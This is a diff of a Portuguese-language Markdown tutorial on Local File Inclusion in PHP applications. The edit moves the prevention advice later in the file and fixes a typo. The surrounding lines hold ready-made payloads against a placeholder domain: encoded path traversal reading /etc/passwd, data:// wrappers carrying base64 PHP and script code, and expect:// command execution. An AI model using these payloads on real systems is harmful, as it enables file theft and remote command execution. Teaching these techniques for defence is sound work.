@@ -38,12 +38,6 @@ https://www.teste.com.br/arquivo.php?img=/%5C../%5C../%5C../%5C../%5C../%5C../%5
 https://www.teste.com.br/arquivo.php?img=%252e%252e%252fetc%252fpasswd
 ```
 
-# Como evitar um ataque de Local File Inclusion? 
-
-* A aplicação precisar validar a entrada do usuário antes de processar o arquivo ou deve verificar se o arquivo especificado é o esperado.
-* Ele deve verificar se o caminho canonizado começa com o diretório base esperado. 
-
-
 # LFI Usando PHP Wrapper && Protocolos
 > Segundo a documentação do PHP, O PHP fornece vários fluxos de E/S variados que permitem o acesso a Fluxos de entrada e saída próprios do PHP, entrada padrão, saída e erro descritores de arquivos, fluxos de arquivos temporários na memória e com backup em disco e filtros que podem manipular outros recursos de arquivo à medida que são lidos e escrito para. 
 
@@ -71,12 +65,16 @@ http://www.teste.com/arquivo.php?img=data:text/plain;base64,PD9waHAgc3lzdGVtKCRf
 https://wwww.teste.com.br/arquivo.php?img=data:application/x-httpd-php;base64,PHNjcmlwdD4gYWxlcnQoMSkgPC9zY3JpcHQ+  (<script> alert(1) </script>) 
 ```
 ## expect://
-> Segundo a documentaçãod o php esse wrapper é possível interagir com processos através de PTY
+> Segundo a documentação o php esse wrapper é possível interagir com processos através de PTY
 ```yaml
 http://www.teste.com/arquivo.php?img=expect://ls
 http://www.teste.com/arquivo.php?img=expect://id
 ```
 
+# Como evitar um ataque de Local File Inclusion? 
+
+* A aplicação precisar validar a entrada do usuário antes de processar o arquivo ou deve verificar se o arquivo especificado é o esperado.
+* Ele deve verificar se o caminho canonizado começa com o diretório base esperado. 
 
 ## Código vulnerável - PHP
 ```php
